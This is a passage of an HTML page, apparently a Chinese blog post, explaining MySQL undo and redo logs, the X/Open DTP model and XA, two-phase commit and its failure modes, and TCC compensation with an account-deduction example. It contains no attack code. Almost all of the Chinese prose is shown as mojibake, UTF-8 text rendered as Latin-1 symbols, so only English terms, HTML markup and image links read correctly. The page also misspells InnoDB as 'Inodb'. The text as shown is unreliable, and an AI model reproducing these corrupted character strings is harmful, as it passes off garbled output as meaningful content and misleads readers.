<li>TCC</li>
<li>å¯é æ¶ˆæ¯æœ€ç»ˆä¸€è‡´</li>
<li>TA</li>
</ul>
<p>ä¸è¿‡ï¼Œè¦æƒ³ææ‡‚è¿™äº›åŸç†ï¼Œä½ å¿…é¡»çŸ¥é“æ•°æ®åº“æœ¬åœ°äº‹åŠ¡æ˜¯å¦‚ä½•å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯undoå’Œredoæ—¥å¿—çš„æ•…äº‹ã€‚</p>
<h3 id="undoå’Œredo"><a href="#undoå’Œredo" class="headerlink" title="undoå’Œredo"></a>undoå’Œredo</h3><p>åœ¨æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œæ—¢æœ‰å­˜æ”¾æ•°æ®çš„æ–‡ä»¶ï¼Œä¹Ÿæœ‰å­˜æ”¾æ—¥å¿—çš„æ–‡ä»¶ã€‚æ—¥å¿—åœ¨å†…å­˜ä¸­ä¹Ÿæ˜¯æœ‰ç¼“å­˜Log bufferï¼Œä¹Ÿæœ‰ç£ç›˜æ–‡ä»¶log fileã€‚MySQLä¸­çš„æ—¥å¿—æ–‡ä»¶ï¼Œæœ‰è¿™ä¹ˆä¸¤ç±»ä¸äº‹åŠ¡æœ‰å…³ï¼šundoæ—¥å¿—ä¸redoæ—¥å¿—ã€‚</p>
<h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>æŒä¹…æ€§å’ŒåŸå­æ€§å¯ä»¥åˆ©ç”¨undo logæ¥å®ç°</p>
<p>åŸç†: ä¸ºäº†æ»¡è¶³äº‹åŠ¡çš„åŸå­æ€§,åœ¨æ“ä½œä»»ä½•æ•°æ®ä¹‹å‰,é¦–å…ˆå°†æ•°æ®å¤‡ä»½åˆ°undo log. ç„¶åè¿›è¡Œæ•°æ®çš„ä¿®æ”¹. å¦‚æœå‡ºç°äº†é”™è¯¯æˆ–è€…ç”¨æˆ·æ‰§è¡Œäº†ROLLBACKè¯­å¥,ç³»ç»Ÿå¯ä»¥åˆ©ç”¨Undo log ä¸­çš„å¤‡ä»½æ•°æ®å°†æ•°æ®æ¢å¤åˆ°äº‹åŠ¡å¼€å§‹ä¹‹å‰çš„çŠ¶æ€.</p>
<p>æ•°æ®åº“å†™å…¥æ•°æ®åˆ°ç£ç›˜ä¹‹å‰, ä¼šæŠŠæ•°æ®å…ˆç¼“å­˜åœ¨å†…å­˜ä¸­,äº‹åŠ¡æäº¤æ—¶æ‰ä¼šå†™å…¥ç£ç›˜ä¸­.</p>
<p>ç”¨undo log å®ç°åŸå­æ€§å’ŒæŒä¹…æ€§çš„äº‹åŠ¡çš„ç®€åŒ–è¿‡ç¨‹: </p>
<p>å‡è®¾æœ‰Aã€Bä¸¤ä¸ªæ•°æ®,å€¼åˆ†åˆ«ä¸º1,2</p>
<p> A. äº‹åŠ¡å¼€å§‹.<br> B. è®°å½•A&#x3D;1åˆ°undo log buffer.<br> C. ä¿®æ”¹A&#x3D;3.<br> D. è®°å½•B&#x3D;2åˆ°undo log buffer.<br> E. ä¿®æ”¹B&#x3D;4.<br> F. å°†undo log bufferå†™åˆ°ç£ç›˜ã€‚<br> G. å°†æ•°æ®å†™åˆ°ç£ç›˜ã€‚<br> H. äº‹åŠ¡æäº¤</p>
<ul>
<li><p>å¦‚ä½•ä¿è¯åŸå­æ€§ï¼Ÿ</p>
<p>åœ¨ä¿®æ”¹æ•°æ®åˆ°ç£ç›˜å‰ï¼Œä¼šå…ˆè®°å½•undo logï¼Œå¹¶å°†undo logæŒä¹…åŒ–åˆ°ç¡¬ç›˜</p>
</li>
<li><p>å¦‚ä½•ä¿è¯æŒä¹…æ€§ï¼Ÿ</p>
<p>åœ¨äº‹åŠ¡æäº¤ä¹‹å‰ï¼ŒæŠŠå†…å­˜ä¸­ç¼“å­˜çš„æ•°æ®å†™å…¥ç£ç›˜ã€‚è¿™æ ·äº‹åŠ¡æäº¤æ—¶ï¼Œå¯ä»¥ç¡®å®šæ•°æ®æ˜¯å·²ç»æŒä¹…åŒ–çš„ï¼Œä¸ä¼šä¸¢å¤±ã€‚</p>
</li>
<li><p>è‹¥ç³»ç»Ÿåœ¨Gå’ŒHä¹‹é—´å´©æºƒ</p>
<p>æ­¤æ—¶äº‹åŠ¡å¹¶æœªæäº¤ï¼Œéœ€è¦å›æ»šã€‚è€Œundo logå·²ç»è¢«æŒä¹…åŒ–ï¼Œå¯ä»¥æ ¹æ®undo logæ¥æ¢å¤æ•°æ®</p>
</li>
<li><p>è‹¥ç³»ç»Ÿåœ¨Gä¹‹å‰å´©æºƒ</p>
<p>æ­¤æ—¶æ•°æ®å¹¶æœªæŒä¹…åŒ–åˆ°ç¡¬ç›˜ï¼Œä¾ç„¶ä¿æŒåœ¨äº‹åŠ¡ä¹‹å‰çš„çŠ¶æ€</p>
</li>
</ul>
<p><strong>ç¼ºé™·ï¼š</strong>æ¯ä¸ªäº‹åŠ¡æäº¤å‰å°†æ•°æ®å’ŒUndo Logå†™å…¥ç£ç›˜ï¼Œè¿™æ ·ä¼šå¯¼è‡´å¤§é‡çš„ç£ç›˜IOï¼Œå› æ­¤æ€§èƒ½å¾ˆä½ã€‚</p>
<p>å¦‚æœèƒ½å¤Ÿå°†æ•°æ®ç¼“å­˜ä¸€æ®µæ—¶é—´ï¼Œå°±èƒ½å‡å°‘IOæé«˜æ€§èƒ½ã€‚ä½†æ˜¯è¿™æ ·å°±ä¼šä¸§å¤±äº‹åŠ¡çš„æŒä¹…æ€§ã€‚å› æ­¤å¼•å…¥äº†å¦å¤–ä¸€ç§æœºåˆ¶æ¥å®ç°æŒä¹…åŒ–ï¼Œå³<strong>Redo Log</strong>.</p>
<h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>å’ŒUndo Logç›¸åï¼ŒRedo Logè®°å½•çš„æ˜¯<strong>æ–°æ•°æ®</strong>çš„å¤‡ä»½ã€‚<strong>åœ¨äº‹åŠ¡æäº¤å‰ï¼Œåªè¦å°†Redo LogæŒä¹…åŒ–å³å¯ï¼Œä¸éœ€è¦å°†æ•°æ®æŒä¹…åŒ–ï¼Œå‡å°‘äº†IOçš„æ¬¡æ•°ã€‚</strong></p>
<p>å…ˆæ¥çœ‹ä¸‹åŸºæœ¬åŸç†ï¼š</p>
<blockquote>
<p><strong>Undo + Redoäº‹åŠ¡çš„ç®€åŒ–è¿‡ç¨‹</strong></p>
</blockquote>
<p> å‡è®¾æœ‰Aã€Bä¸¤ä¸ªæ•°æ®ï¼Œå€¼åˆ†åˆ«ä¸º1,2</p>
<p> A. äº‹åŠ¡å¼€å§‹.<br> B. è®°å½•A&#x3D;1åˆ°undo log.<br> C. ä¿®æ”¹A&#x3D;3.<br> D. è®°å½•A&#x3D;3åˆ°redo log.<br> E. è®°å½•B&#x3D;2åˆ°undo log.<br> F. ä¿®æ”¹B&#x3D;4.<br> G. è®°å½•B&#x3D;4åˆ°redo log.<br> H. å°†undo logå†™å…¥redo log<br> I. å°†redo logå†™å…¥ç£ç›˜<br> J. äº‹åŠ¡æäº¤</p>
<blockquote>
<p>å®‰å…¨å’Œæ€§èƒ½é—®é¢˜</p>
</blockquote>
<ul>
<li><p>å¦‚ä½•ä¿è¯åŸå­æ€§ï¼Ÿ</p>
<p>å¦‚æœåœ¨äº‹åŠ¡æäº¤å‰æ•…éšœï¼Œé€šè¿‡undo logæ—¥å¿—æ¢å¤æ•°æ®ã€‚å¦‚æœundo logéƒ½è¿˜æ²¡å†™å…¥ï¼Œé‚£ä¹ˆæ•°æ®å°±å°šæœªæŒä¹…åŒ–ï¼Œæ— éœ€å›æ»š</p>
</li>
<li><p>å¦‚ä½•ä¿è¯æŒä¹…åŒ–ï¼Ÿ</p>
<p>å¤§å®¶ä¼šå‘ç°ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰å‡ºç°æ•°æ®çš„æŒä¹…åŒ–ã€‚å› ä¸ºæ•°æ®å·²ç»å†™å…¥redo logï¼Œè€Œredo logæŒä¹…åŒ–åˆ°äº†ç¡¬ç›˜ï¼Œå› æ­¤åªè¦åˆ°äº†Iä»¥åï¼Œäº‹åŠ¡æ˜¯å¯ä»¥æäº¤çš„ã€‚</p>
</li>
<li><p>å†…å­˜ä¸­çš„æ•°æ®åº“æ•°æ®ä½•æ—¶æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Ÿ</p>
<p>å› ä¸ºredo logå·²ç»æŒä¹…åŒ–ï¼Œå› æ­¤æ•°æ®åº“æ•°æ®å†™å…¥ç£ç›˜ä¸å¦å½±å“ä¸å¤§ï¼Œä¸è¿‡ä¸ºäº†é¿å…å‡ºç°è„æ•°æ®ï¼ˆå†…å­˜ä¸­ä¸ç£ç›˜ä¸ä¸€è‡´ï¼‰ï¼Œäº‹åŠ¡æäº¤åä¹Ÿä¼šå°†å†…å­˜æ•°æ®åˆ·å…¥ç£ç›˜ï¼ˆä¹Ÿå¯ä»¥æŒ‰ç…§å›ºè®¾å®šçš„é¢‘ç‡åˆ·æ–°å†…å­˜æ•°æ®åˆ°ç£ç›˜ä¸­ï¼‰ã€‚</p>
</li>
<li><p>æŒä¹…åŒ–redoå’ŒæŒä¹…åŒ–æ•°æ®åº“æ•°æ®æœ‰ä»€ä¹ˆæ€§èƒ½å·®å¼‚ï¼Ÿ</p>
<ul>
<li><p>æ•°æ®åº“æ•°æ®å†™å…¥æ˜¯éšæœºIOï¼Œæ€§èƒ½å¾ˆå·®</p>
</li>
<li><p>redo logåœ¨åˆå§‹åŒ–æ—¶ä¼šå¼€è¾Ÿä¸€æ®µè¿ç»­çš„ç©ºé—´ï¼Œå†™å…¥æ˜¯é¡ºåºIOï¼Œæ€§èƒ½å¾ˆå¥½</p>
</li>
</ul>
</li>
<li><p>redo logä¸­è®°å½•çš„æ•°æ®ï¼Œæœ‰å¯èƒ½å°šæœªæäº¤ï¼Œé‚£ä¹ˆå¦‚ä½•å®Œæˆæ•°æ®æ¢å¤ï¼Ÿ</p>
<p>æ•°æ®æ¢å¤æœ‰ä¸¤ç§ç­–ç•¥ï¼š</p>
<ul>
<li>æ¢å¤æ—¶ï¼Œåªé‡åšå·²ç»æäº¤äº†çš„äº‹åŠ¡</li>
<li>æ¢å¤æ—¶ï¼Œé‡åšæ‰€æœ‰äº‹åŠ¡åŒ…æ‹¬æœªæäº¤çš„äº‹åŠ¡å’Œå›æ»šäº†çš„äº‹åŠ¡ã€‚ç„¶åé€šè¿‡Undo Logå›æ»šé‚£äº›æœªæäº¤çš„äº‹åŠ¡</li>
</ul>
<p>Inodbå¼•æ“é‡‡ç”¨çš„æ˜¯ç¬¬äºŒç§æ–¹æ¡ˆï¼Œå› æ­¤undo logè¦åœ¨ redo logå‰æŒä¹…åŒ–</p>
</li>
<li><p>å†™å…¥æ€§èƒ½çš„ä¼˜åŒ–</p>
<p>äº‹åŠ¡æäº¤å‰éœ€è¦åŒæ—¶å†™å…¥undo logå’Œ redo logï¼ŒåŠ¿å¿…å¢åŠ IOæ¬¡æ•°ï¼Œå› æ­¤å®é™…ä¸Šundo logå¹¶ä¸æ˜¯ç›´æ¥å†™å…¥ç£ç›˜ï¼Œè€Œæ˜¯å…ˆå†™å…¥åˆ°redo logä¸­ï¼Œå½“redo logæŒä¹…åŒ–æ—¶ï¼Œundo logå°±åŒæ—¶æŒä¹…åŒ–åˆ°ç¡¬ç›˜äº†ã€‚</p>
<p>å› æ­¤äº‹åŠ¡æäº¤å‰ï¼Œåªéœ€è¦å¯¹redo logæŒä¹…åŒ–å³å¯ã€‚</p>
<p>å¦å¤–ï¼Œredo logå¹¶ä¸æ˜¯å†™å…¥ä¸€æ¬¡å°±æŒä¹…åŒ–ä¸€æ¬¡ï¼Œredo logåœ¨å†…å­˜ä¸­ä¹Ÿæœ‰è‡ªå·±çš„ç¼“å†²æ± ï¼š<code>redo log buffer</code>ã€‚æ¯æ¬¡å†™redo logéƒ½æ˜¯å†™å…¥åˆ°bufferï¼Œåœ¨æäº¤æ—¶ä¸€æ¬¡æ€§æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œå‡å°‘IOæ­¤æ—¶ã€‚</p>
</li>
</ul>
<h4 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æœ€åæ€»ç»“ä¸€ä¸‹ï¼š</p>
<ul>
<li>undo log è®°å½•æ›´æ–°å‰æ•°æ®ï¼Œç”¨äºä¿è¯äº‹åŠ¡åŸå­æ€§</li>
<li>redo log è®°å½•æ›´æ–°åæ•°æ®ï¼Œç”¨äºä¿è¯äº‹åŠ¡çš„æŒä¹…æ€§</li>
<li>redo logæœ‰è‡ªå·±çš„å†…å­˜bufferï¼Œå…ˆå†™å…¥åˆ°bufferï¼Œäº‹åŠ¡æäº¤æ—¶å†™å…¥ç£ç›˜</li>
<li>redo logæŒä¹…åŒ–ä¹‹åï¼Œæ„å‘³ç€äº‹åŠ¡æ˜¯<strong>å¯æäº¤</strong>çš„</li>
</ul>
<h3 id="åˆ†é˜¶æ®µæäº¤"><a href="#åˆ†é˜¶æ®µæäº¤" class="headerlink" title="åˆ†é˜¶æ®µæäº¤"></a>åˆ†é˜¶æ®µæäº¤</h3><h4 id="DTPå’ŒXA"><a href="#DTPå’ŒXA" class="headerlink" title="DTPå’ŒXA"></a>DTPå’ŒXA</h4><p>åˆ†å¸ƒå¼äº‹åŠ¡çš„è§£å†³æ‰‹æ®µä¹‹ä¸€ï¼Œå°±æ˜¯ä¸¤é˜¶æ®µæäº¤åè®®ï¼ˆ2PCï¼šTwo-Phase Commitï¼‰</p>
<p>é‚£ä¹ˆåˆ°åº•ä»€ä¹ˆæ˜¯ä¸¤é˜¶æ®µæäº¤åè®®å‘¢ï¼Ÿ</p>
<p>1994 å¹´ï¼ŒX&#x2F;Open ç»„ç»‡ï¼ˆå³ç°åœ¨çš„ Open Group ï¼‰å®šä¹‰äº†åˆ†å¸ƒå¼äº‹åŠ¡å¤„ç†çš„DTP æ¨¡å‹ã€‚è¯¥æ¨¡å‹åŒ…æ‹¬è¿™æ ·å‡ ä¸ªè§’è‰²ï¼š</p>
<ul>
<li>åº”ç”¨ç¨‹åºï¼ˆ AP,Application ï¼‰ï¼šæˆ‘ä»¬çš„å¾®æœåŠ¡</li>
<li>äº‹åŠ¡ç®¡ç†å™¨ï¼ˆ TM, Transction Managerï¼‰ï¼šå…¨å±€äº‹åŠ¡ç®¡ç†è€…</li>
<li>èµ„æºç®¡ç†å™¨ï¼ˆ RM, Resource Manager ï¼‰ï¼šä¸€èˆ¬æ˜¯æ•°æ®åº“</li>
<li>é€šä¿¡èµ„æºç®¡ç†å™¨ï¼ˆ CRM, Communication Resource Managerï¼‰ï¼šæ˜¯TMå’ŒRMé—´çš„é€šä¿¡ä¸­é—´ä»¶</li>
</ul>
<p>åœ¨è¯¥æ¨¡å‹ä¸­ï¼Œä¸€ä¸ªåˆ†å¸ƒå¼äº‹åŠ¡ï¼ˆå…¨å±€äº‹åŠ¡ï¼‰å¯ä»¥è¢«æ‹†åˆ†æˆè®¸å¤šä¸ªæœ¬åœ°äº‹åŠ¡ï¼Œè¿è¡Œåœ¨ä¸åŒçš„APå’ŒRMä¸Šã€‚æ¯ä¸ªæœ¬åœ°äº‹åŠ¡çš„ACIDå¾ˆå¥½å®ç°ï¼Œä½†æ˜¯å…¨å±€äº‹åŠ¡å¿…é¡»ä¿è¯å…¶ä¸­åŒ…å«çš„æ¯ä¸€ä¸ªæœ¬åœ°äº‹åŠ¡éƒ½èƒ½åŒæ—¶æˆåŠŸï¼Œè‹¥æœ‰ä¸€ä¸ªæœ¬åœ°äº‹åŠ¡å¤±è´¥ï¼Œåˆ™æ‰€æœ‰å…¶å®ƒäº‹åŠ¡éƒ½å¿…é¡»å›æ»šã€‚ä½†é—®é¢˜æ˜¯ï¼Œæœ¬åœ°äº‹åŠ¡å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå¹¶ä¸çŸ¥é“å…¶å®ƒäº‹åŠ¡çš„è¿è¡ŒçŠ¶æ€ã€‚å› æ­¤ï¼Œå°±éœ€è¦é€šè¿‡CRMæ¥é€šçŸ¥å„ä¸ªæœ¬åœ°äº‹åŠ¡ï¼ŒåŒæ­¥äº‹åŠ¡æ‰§è¡Œçš„çŠ¶æ€ã€‚</p>
<p>å› æ­¤ï¼Œå„ä¸ªæœ¬åœ°äº‹åŠ¡çš„é€šä¿¡å¿…é¡»æœ‰ç»Ÿä¸€çš„æ ‡å‡†ï¼Œå¦åˆ™ä¸åŒæ•°æ®åº“é—´å°±æ— æ³•é€šä¿¡ã€‚<strong>XA</strong>å°±æ˜¯ X&#x2F;Open DTPä¸­é€šä¿¡ä¸­é—´ä»¶ä¸TMé—´è”ç³»çš„<strong>æ¥å£è§„èŒƒ</strong>ï¼Œå®šä¹‰äº†ç”¨äºé€šçŸ¥äº‹åŠ¡å¼€å§‹ã€æäº¤ã€ç»ˆæ­¢ã€å›æ»šç­‰æ¥å£ï¼Œå„ä¸ªæ•°æ®åº“å‚å•†éƒ½å¿…é¡»å®ç°è¿™äº›æ¥å£ã€‚</p>
<h4 id="äºŒé˜¶æ®µæäº¤"><a href="#äºŒé˜¶æ®µæäº¤" class="headerlink" title="äºŒé˜¶æ®µæäº¤"></a>äºŒé˜¶æ®µæäº¤</h4><p>2PCï¼šTwo-Phase(feis) Commitï¼‰</p>
<p>å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/35298019">æ¼«è¯åˆ†å¸ƒå¼ç³»ç»Ÿå…±è¯†åè®®: 2PC&#x2F;3PCç¯‡</a></p>
<p><strong>äºŒé˜¶æäº¤åè®®</strong>å°±æ˜¯æ ¹æ®è¿™ä¸€æ€æƒ³è¡ç”Ÿå‡ºæ¥çš„ï¼Œå°†å…¨å±€äº‹åŠ¡æ‹†åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µæ¥æ‰§è¡Œï¼š</p>
<ul>
<li>é˜¶æ®µä¸€ï¼šå‡†å¤‡é˜¶æ®µï¼Œå„ä¸ªæœ¬åœ°äº‹åŠ¡å®Œæˆæœ¬åœ°äº‹åŠ¡çš„å‡†å¤‡å·¥ä½œã€‚</li>
<li>é˜¶æ®µäºŒï¼šæ‰§è¡Œé˜¶æ®µï¼Œå„ä¸ªæœ¬åœ°äº‹åŠ¡æ ¹æ®ä¸Šä¸€é˜¶æ®µæ‰§è¡Œç»“æœï¼Œè¿›è¡Œæäº¤æˆ–å›æ»šã€‚</li>
</ul>
<p>è¿™ä¸ªè¿‡ç¨‹ä¸­éœ€è¦ä¸€ä¸ªåè°ƒè€…ï¼ˆcoordinatorï¼‰ï¼Œè¿˜æœ‰äº‹åŠ¡çš„å‚ä¸è€…ï¼ˆvoterï¼‰ã€‚</p>
<blockquote>
<p>1ï¼‰æ­£å¸¸æƒ…å†µ</p>
</blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149745.png" alt="image-20200305141029973"> </p>
<p><strong>æŠ•ç¥¨é˜¶æ®µ</strong>ï¼šåè°ƒç»„è¯¢é—®å„ä¸ªäº‹åŠ¡å‚ä¸è€…ï¼Œæ˜¯å¦å¯ä»¥æ‰§è¡Œäº‹åŠ¡ã€‚æ¯ä¸ªäº‹åŠ¡å‚ä¸è€…æ‰§è¡Œäº‹åŠ¡ï¼Œå†™å…¥redoå’Œundoæ—¥å¿—ï¼Œç„¶ååé¦ˆäº‹åŠ¡æ‰§è¡ŒæˆåŠŸçš„ä¿¡æ¯ï¼ˆ<code>agree</code>ï¼‰</p>
<p><strong>æäº¤é˜¶æ®µ</strong>ï¼šåè°ƒç»„å‘ç°æ¯ä¸ªå‚ä¸è€…éƒ½å¯ä»¥æ‰§è¡Œäº‹åŠ¡ï¼ˆ<code>agree</code>ï¼‰ï¼Œäºæ˜¯å‘å„ä¸ªäº‹åŠ¡å‚ä¸è€…å‘å‡º<code>commit</code>æŒ‡ä»¤ï¼Œå„ä¸ªäº‹åŠ¡å‚ä¸è€…æäº¤äº‹åŠ¡ã€‚</p>
<blockquote>
<p>2ï¼‰å¼‚å¸¸æƒ…å†µ</p>
</blockquote>
<p>å½“ç„¶ï¼Œä¹Ÿæœ‰å¼‚å¸¸çš„æ—¶å€™ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149746.png" alt="image-20200305141318326"> </p>
<p><strong>æŠ•ç¥¨é˜¶æ®µ</strong>ï¼šåè°ƒç»„è¯¢é—®å„ä¸ªäº‹åŠ¡å‚ä¸è€…ï¼Œæ˜¯å¦å¯ä»¥æ‰§è¡Œäº‹åŠ¡ã€‚æ¯ä¸ªäº‹åŠ¡å‚ä¸è€…æ‰§è¡Œäº‹åŠ¡ï¼Œå†™å…¥redoå’Œundoæ—¥å¿—ï¼Œç„¶ååé¦ˆäº‹åŠ¡æ‰§è¡Œç»“æœï¼Œä½†åªè¦æœ‰ä¸€ä¸ªå‚ä¸è€…è¿”å›çš„æ˜¯<code>Disagree</code>ï¼Œåˆ™è¯´æ˜æ‰§è¡Œå¤±è´¥ã€‚</p>
<p><strong>æäº¤é˜¶æ®µ</strong>ï¼šåè°ƒç»„å‘ç°æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå‚ä¸è€…è¿”å›çš„æ˜¯<code>Disagree</code>ï¼Œè®¤ä¸ºæ‰§è¡Œå¤±è´¥ã€‚äºæ˜¯å‘å„ä¸ªäº‹åŠ¡å‚ä¸è€…å‘å‡º<code>abort</code>æŒ‡ä»¤ï¼Œå„ä¸ªäº‹åŠ¡å‚ä¸è€…å›æ»šäº‹åŠ¡ã€‚</p>
<blockquote>
<p>3ï¼‰ç¼ºé™·</p>
</blockquote>
<p>äºŒé˜¶æ®µæäº¤çš„é—®é¢˜ï¼š</p>
<ul>
<li><p>å•ç‚¹æ•…éšœé—®é¢˜</p>
<p>2PCçš„ç¼ºç‚¹åœ¨äºä¸èƒ½å¤„ç†fail-stopå½¢å¼çš„èŠ‚ç‚¹failure. æ¯”å¦‚ä¸‹å›¾è¿™ç§æƒ…å†µ.</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149747.png" alt="image-20200305142812815"> </p>
<p>å‡è®¾coordinatorå’Œvoter3éƒ½åœ¨Commitè¿™ä¸ªé˜¶æ®µcrashäº†, è€Œvoter1å’Œvoter2æ²¡æœ‰æ”¶åˆ°commitæ¶ˆæ¯. è¿™æ—¶å€™voter1å’Œvoter2å°±é™·å…¥äº†ä¸€ä¸ªå›°å¢ƒ. å› ä¸ºä»–ä»¬å¹¶ä¸èƒ½åˆ¤æ–­ç°åœ¨æ˜¯ä¸¤ä¸ªåœºæ™¯ä¸­çš„å“ªä¸€ç§:</p>
<p> (1)ä¸Šè½®å…¨ç¥¨é€šè¿‡ç„¶åvoter3ç¬¬ä¸€ä¸ªæ”¶åˆ°äº†commitçš„æ¶ˆæ¯å¹¶åœ¨commitæ“ä½œä¹‹åcrashäº†</p>
<p> (2)ä¸Šè½®voter3åå¯¹æ‰€ä»¥å¹²è„†æ²¡æœ‰é€šè¿‡.</p>
</li>
<li><p>é˜»å¡é—®é¢˜</p>
<p>åœ¨å‡†å¤‡é˜¶æ®µã€æäº¤é˜¶æ®µï¼Œæ¯ä¸ªäº‹ç‰©å‚ä¸è€…éƒ½ä¼šé”å®šæœ¬åœ°èµ„æºï¼Œå¹¶ç­‰å¾…å…¶å®ƒäº‹åŠ¡çš„æ‰§è¡Œç»“æœï¼Œé˜»å¡æ—¶é—´è¾ƒé•¿ï¼Œèµ„æºé”å®šæ—¶é—´å¤ªä¹…ï¼Œå› æ­¤æ‰§è¡Œçš„æ•ˆç‡å°±æ¯”è¾ƒä½äº†ã€‚</p>
</li>
</ul>
<p>é¢å¯¹äºŒé˜¶æ®µæäº¤çš„ä¸Šè¿°ç¼ºç‚¹ï¼Œåæ¥åˆæ¼”å˜å‡ºäº†ä¸‰é˜¶æ®µæäº¤ï¼Œä½†æ˜¯ä¾ç„¶æ²¡æœ‰å®Œå…¨è§£å†³é˜»å¡å’Œèµ„æºé”å®šçš„é—®é¢˜ï¼Œè€Œä¸”å¼•å…¥äº†ä¸€äº›æ–°çš„é—®é¢˜ï¼Œå› æ­¤å®é™…ä½¿ç”¨çš„åœºæ™¯è¾ƒå°‘ã€‚å¯¹äº‹åŠ¡æœ‰å¼ºä¸€è‡´æ€§è¦æ±‚,å¯¹äº‹åŠ¡çš„æ‰§è¡Œæ•ˆç‡ä¸æ•æ„Ÿ,å¹¶ä¸”ä¸å¸Œæœ›æœ‰å¤ªå¤šçš„ä»£ç ä¾µå…¥.</p>
<h3 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h3><p>Try-confirm-cancel</p>
<p>TCCæ¨¡å¼å¯ä»¥è§£å†³2PCä¸­çš„èµ„æºé”å®šå’Œé˜»å¡é—®é¢˜ï¼Œå‡å°‘èµ„æºé”å®šæ—¶é—´ã€‚å®ƒé‡‡ç”¨çš„æ˜¯ä¸€ç§è¡¥å¿å‹äº‹åŠ¡çš„æ€æƒ³ã€‚</p>
<h4 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h4><p>å®ƒæœ¬è´¨æ˜¯ä¸€ç§è¡¥å¿çš„æ€è·¯ã€‚äº‹åŠ¡è¿è¡Œè¿‡ç¨‹åŒ…æ‹¬ä¸‰ä¸ªæ–¹æ³•ï¼Œ</p>
<ul>
<li>Tryï¼šèµ„æºçš„æ£€æµ‹å’Œé¢„ç•™ï¼›</li>
<li>Confirmï¼šæ‰§è¡Œçš„ä¸šåŠ¡æ“ä½œæäº¤ï¼›è¦æ±‚ Try æˆåŠŸ Confirm ä¸€å®šè¦èƒ½æˆåŠŸï¼›</li>
<li>Cancelï¼šé¢„ç•™èµ„æºé‡Šæ”¾ã€‚</li>
</ul>
<p>æ‰§è¡Œåˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ul>
<li>å‡†å¤‡é˜¶æ®µï¼ˆtryï¼‰ï¼šèµ„æºçš„æ£€æµ‹å’Œé¢„ç•™ï¼›</li>
<li>æ‰§è¡Œé˜¶æ®µï¼ˆconfirm&#x2F;cancelï¼‰ï¼šæ ¹æ®ä¸Šä¸€æ­¥ç»“æœï¼Œåˆ¤æ–­ä¸‹é¢çš„æ‰§è¡Œæ–¹æ³•ã€‚å¦‚æœä¸Šä¸€æ­¥ä¸­æ‰€æœ‰äº‹åŠ¡å‚ä¸è€…éƒ½æˆåŠŸï¼Œåˆ™è¿™é‡Œæ‰§è¡Œconfirmã€‚åä¹‹ï¼Œæ‰§è¡Œcancel</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149748.png" alt="image-20200305155521612"> </p>
<p>ç²—çœ‹ä¼¼ä¹ä¸ä¸¤é˜¶æ®µæäº¤æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œä½†å…¶å®å·®åˆ«å¾ˆå¤§ï¼š</p>
<ul>
<li>tryã€confirmã€canceléƒ½æ˜¯ç‹¬ç«‹çš„äº‹åŠ¡ï¼Œä¸å—å…¶å®ƒå‚ä¸è€…çš„å½±å“ï¼Œä¸ä¼šé˜»å¡ç­‰å¾…å®ƒäºº</li>
<li>tryã€confirmã€cancelç”±ç¨‹åºå‘˜åœ¨ä¸šåŠ¡å±‚ç¼–å†™ï¼Œé”ç²’åº¦æœ‰ä»£ç æ§åˆ¶</li>
</ul>
<h4 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h4><p>æˆ‘ä»¬ä»¥ä¹‹å‰çš„ä¸‹å•ä¸šåŠ¡ä¸­çš„æ‰£å‡ä½™é¢ä¸ºä¾‹æ¥çœ‹ä¸‹ä¸‰ä¸ªä¸åŒçš„æ–¹æ³•è¦æ€ä¹ˆç¼–å†™ï¼Œå‡è®¾è´¦æˆ·AåŸæ¥ä½™é¢æ˜¯100ï¼Œéœ€è¦ä½™é¢æ‰£å‡30å…ƒã€‚å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149749.png" alt="image-20200305155830732"></p>
<ul>
<li><p>ä¸€é˜¶æ®µï¼ˆTryï¼‰ï¼šä½™é¢æ£€æŸ¥ï¼Œå¹¶å†»ç»“ç”¨æˆ·éƒ¨åˆ†é‡‘é¢ï¼Œæ­¤é˜¶æ®µæ‰§è¡Œå®Œæ¯•ï¼Œäº‹åŠ¡å·²ç»æäº¤</p>
<ul>
<li>æ£€æŸ¥ç”¨æˆ·ä½™é¢æ˜¯å¦å……è¶³ï¼Œå¦‚æœå……è¶³ï¼Œå†»ç»“éƒ¨åˆ†ä½™é¢</li>
<li>åœ¨è´¦æˆ·è¡¨ä¸­æ·»åŠ å†»ç»“é‡‘é¢å­—æ®µï¼Œå€¼ä¸º30ï¼Œä½™é¢ä¸å˜</li>
</ul>
</li>
<li><p>äºŒé˜¶æ®µ</p>
<ul>
<li>æäº¤ï¼ˆConfirmï¼‰ï¼šçœŸæ­£çš„æ‰£æ¬¾ï¼ŒæŠŠå†»ç»“é‡‘é¢ä»ä½™é¢ä¸­æ‰£é™¤ï¼Œå†»ç»“é‡‘é¢æ¸…ç©º<ul>
<li>ä¿®æ”¹å†»ç»“é‡‘é¢ä¸º0ï¼Œä¿®æ”¹ä½™é¢ä¸º100-30 &#x3D; 70å…ƒ</li>
</ul>
</li>
